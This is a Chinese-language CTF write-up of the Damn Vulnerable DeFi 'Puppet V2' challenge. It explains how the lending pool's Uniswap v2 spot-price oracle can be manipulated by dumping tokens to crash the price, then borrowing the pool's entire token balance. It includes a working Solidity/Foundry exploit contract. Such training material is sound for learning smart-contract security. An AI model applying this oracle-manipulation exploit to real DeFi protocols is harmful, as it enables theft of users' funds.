# Puppet V2

## 题目介绍

> **Puppet V2**
>
> **上一个池子的开发人员似乎已经吸取了教训。并发布了一个新版本。**
>
> **现在，他们正在使用Uniswap v2交换器作为价格神谕，以及推荐的实用程序库。这还不够吗？**
>
> **您从20个ETH和10000个DVT代币开始平衡。池子有100万个DVT代币处于危险之中！**
>
> **从池中保存所有资金，并将其存入指定的恢复账户。**

## 合约分析

这道题和之前的v1基本上一模一样，这个使用了uni的v2版本来进行操纵，原理基本一样。

``` solidity
    /**
     * @notice Allows borrowing tokens by first depositing three times their value in WETH
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and borrowed token have same amount of decimals.
     */
    function borrow(uint256 borrowAmount) external {
        // Calculate how much WETH the user must deposit
        uint256 amount = calculateDepositOfWETHRequired(borrowAmount);

        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), amount);

        // internal accounting
        deposits[msg.sender] += amount;

        require(_token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp);
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        uint256 depositFactor = 3;
        return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }
```



## 解题过程

1.先计算池子的储备，根据储备计算1000的token可以换出多少eth，然后直接swap出来。

2.砸盘以后token的价格特别便宜，然后我们就可以利用我们的eth借走全部的token。

3.把钱转到恢复地址。完成攻击

**poc**

``````solidity
    function test_puppetV2() public checkSolvedByPlayer {
        Exploit Attack=new Exploit{value: address(player).balance}(token,lendingPool,uniswapV2Exchange,recovery,weth);
        (uint256 a,uint256 b,uint32 c)=uniswapV2Exchange.getReserves();
        uint256 out=uniswapV2Router.getAmountOut(10000 ether, b, a);
        token.transfer(address(uniswapV2Exchange), 10000 ether);
        uniswapV2Exchange.swap(out, 0, address(Attack), "");
        Attack.attack();
    }
contract Exploit is Test{

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;
    address public recovery;

    constructor(DamnValuableToken _token,PuppetV2Pool _lendingpool,IUniswapV2Pair _uniswapV2Exchange,address _recovery,WETH _weth)payable {
        token=_token;
        lendingPool=_lendingpool;
        uniswapV2Exchange=_uniswapV2Exchange;
        recovery=_recovery;
        weth=_weth;
    }
    function attack()payable public{
        weth.deposit{value: address(this).balance}();
        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(1000000 ether);
        token.transfer(recovery, 1000000 ether);
    }
    receive() external payable{}
}
``````
